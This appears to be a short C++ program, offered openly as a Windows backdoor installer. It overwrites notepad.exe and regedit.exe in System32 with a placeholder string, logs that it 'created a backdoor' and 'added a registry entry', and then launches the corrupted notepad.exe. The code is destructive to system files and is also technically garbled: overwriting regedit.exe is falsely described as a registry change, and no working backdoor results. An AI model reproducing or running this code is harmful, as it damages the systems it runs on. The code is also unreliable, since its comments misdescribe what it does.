#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>

void log(const std::string& message) {
    std::ofstream file("backdoor_log.txt", std::ios_base::app);
    if (file.is_open()) {
        file << message << "\n";
        file.close();
    }
}

int main() {
    // Create a backdoor in the system
    std::ofstream file("C:\\Windows\\System32\\notepad.exe", std::ios_base::out | std::ios_base::binary);
    if (file.is_open()) {
        file << "backdoor_code\n";
        file.close();
        log("Backdoor created at C:\\Windows\\System32\\notepad.exe");
    } else {
        log("Failed to create backdoor at C:\\Windows\\System32\\notepad.exe");
    }

    // Add a registry entry for the backdoor
    std::ofstream regFile("C:\\Windows\\system32\\regedit.exe", std::ios_base::out | std::ios_base::binary);
    if (regFile.is_open()) {
        regFile << "backdoor_code\n";
        regFile.close();
        log("Registry entry added at C:\\Windows\\System32\\regedit.exe");
    } else {
        log("Failed to add registry entry at C:\\Windows\\System32\\regedit.exe");
    }

    // Run the backdoor
    std::string command = "C:\\Windows\\System32\\notepad.exe";
    system(command.c_str());
    
    return 0;
}
